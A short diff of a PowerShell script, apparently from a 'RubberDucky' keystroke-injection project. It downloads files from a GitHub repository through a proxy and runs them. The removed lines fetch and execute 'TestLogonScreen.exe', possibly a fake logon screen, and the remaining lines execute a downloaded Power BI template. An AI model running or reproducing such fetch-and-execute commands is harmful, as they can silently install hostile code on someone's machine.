@@ -26,7 +26,7 @@ if($dbs.count -eq 0)
 	}
 }
 curl -usebasicparsing -proxy $proxy "https://raw.githubusercontent.com/jerfe/RubberDucky/main/PCActivity.pbit" -outfile "$workingfolder/PCActivity.pbit"
-curl -usebasicparsing -proxy $proxy "https://raw.githubusercontent.com/jerfe/RubberDucky/main/TestLogonScreen.exe" -outfile "$workingfolder/logScreen.exe"
-&"$workingfolder/logScreen.exe"
-#&"$workingfolder/PCActivity.pbit"
+#curl -usebasicparsing -proxy $proxy "https://raw.githubusercontent.com/jerfe/RubberDucky/main/TestLogonScreen.exe" -outfile "$workingfolder/logScreen.exe"
+#&"$workingfolder/logScreen.exe"
+&"$workingfolder/PCActivity.pbit"
 
